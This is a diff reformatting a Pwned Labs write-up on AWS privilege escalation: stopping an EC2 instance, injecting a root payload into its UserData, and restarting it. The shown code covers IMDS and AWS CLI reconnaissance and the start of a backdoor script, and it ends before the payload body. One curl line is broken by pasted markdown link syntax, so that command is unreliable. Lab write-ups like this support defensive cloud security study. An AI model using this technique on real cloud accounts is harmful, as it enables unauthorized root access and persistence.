@@ -1,11 +1,42 @@
-AWS EC2 UserData Privilege Escalation (Pwned Labs Write-Up)Lab Title: **Command Injection** 
-**AWS IAM Misconfiguration to EC2 UserData Privilege EscalationPlatform:**
-**Pwned LabsTarget Architecture**: AWS EC2, IAM, Linux HostAuthor: Lethabo Sangweni1.
-**Executive Summary**
-During this lab, an initial access foothold was leveraged to inspect local AWS credentials and permissions. Enumeration revealed a misconfigured IAM policy granting sensitive EC2 management permissions (ec2:ModifyInstanceAttribute, ec2:StopInstances, ec2:StartInstances, ec2:DescribeInstances).  By stopping the target EC2 instance, injecting a custom Base64-encoded bash script into the instance's UserData attribute, and restarting the virtual machine, the payload executed with local root privileges upon system boot. This granted local host root escalation and persistence.  
-2. Technical Prerequisites & Required PermissionsThe privilege escalation vector relies on holding the following set of IAM permissions on the target EC2 resource:IAM PermissionAction / Impactec2:DescribeInstancesEnumerate instance IDs, status, and attached roles.ec2:StopInstancesShut down the targeted EC2 instance (required to modify UserData).ec2:ModifyInstanceAttributeModify the base64-encoded userData attribute.ec2:StartInstancesBoot the instance to trigger cloud-init payload execution.3. Attack Execution WalkthroughPhase
-1: Reconnaissance & Target IdentificationFrom the compromised host session, retrieve the target instance ID via Instance Metadata Service (IMDSv1/v2) or AWS CLI:Bash# Retrieve current Instance ID via IMDS
-INSTANCE_ID=$(curl -s http://169.254.169.254/latest/meta-data/instance-id)
+# AWS EC2 UserData Privilege Escalation (Pwned Labs Write-Up)
+
+**Lab Title:** Command Injection to EC2 UserData Privilege Escalation  
+**Platform:** Pwned Labs  
+**Target Architecture:** AWS EC2, IAM, Linux Host  
+**Author:** Lethabo Sangweni  
+
+---
+
+## 1. Executive Summary
+
+During this assessment, an initial access foothold was leveraged to inspect local AWS credentials and permissions. Enumeration revealed a misconfigured IAM policy granting sensitive EC2 management permissions (`ec2:ModifyInstanceAttribute`, `ec2:StopInstances`, `ec2:StartInstances`, and `ec2:DescribeInstances`).
+
+By stopping the target EC2 instance, injecting a custom Base64-encoded bash payload into the instance's `UserData` attribute, and restarting the virtual machine, the script executed with local system `root` privileges upon boot via `cloud-init`. This resulted in local host root privilege escalation and persistent administrative access.
+
+---
+
+## 2. Technical Prerequisites & Required Permissions
+
+This privilege escalation vector requires the security principal to hold the following set of IAM permissions on the target EC2 resource:
+
+| IAM Permission | Action / Operational Impact |
+| :--- | :--- |
+| `ec2:DescribeInstances` | Enumerate target instance IDs, state, public/private IP addresses, and attached IAM roles. |
+| `ec2:StopInstances` | Shut down the targeted EC2 instance (mandatory step, as `UserData` cannot be modified while running). |
+| `ec2:ModifyInstanceAttribute` | Modify the Base64-encoded `userData` attribute to inject arbitrary commands. |
+| `ec2:StartInstances` | Boot the instance to trigger automated execution of the `cloud-init` payload. |
+
+---
+
+## 3. Attack Execution Walkthrough
+
+### Phase 1: Reconnaissance & Target Identification
+
+From the compromised initial foothold session, identify the target instance ID using the AWS Instance Metadata Service (IMDS) or the AWS CLI:
+
+```bash
+# Retrieve current Instance ID via IMDS
+INSTANCE_ID=$(curl -s [http://169.254.169.254/latest/meta-data/instance-id](http://169.254.169.254/latest/meta-data/instance-id))
 echo "Target Instance ID: $INSTANCE_ID"
 <img width="962" height="921" alt="website" src="https://github.com/user-attachments/assets/9a8d2e56-f5f6-4bc4-8579-5517293aefde" />
 # Verify IAM permissions against EC2
@@ -13,6 +44,7 @@ aws ec2 describe-instances \
     --instance-ids $INSTANCE_ID \
     --query "Reservations[*].Instances[*].[InstanceId,State.Name,IamInstanceProfile.Arn]"
 Phase 2: Weaponization (Payload Creation)Draft a script that grants SUID administrative privilege to /bin/bash or creates an elevated backdoor user.Bashcat << 'EOF' > malicious_userdata.sh
+
 #!/bin/bash
 <img width="962" height="999" alt="UserPolicies" src="https://github.com/user-attachments/assets/e7c7f4ec-87ed-419f-b3f7-6929d753e362" />
 
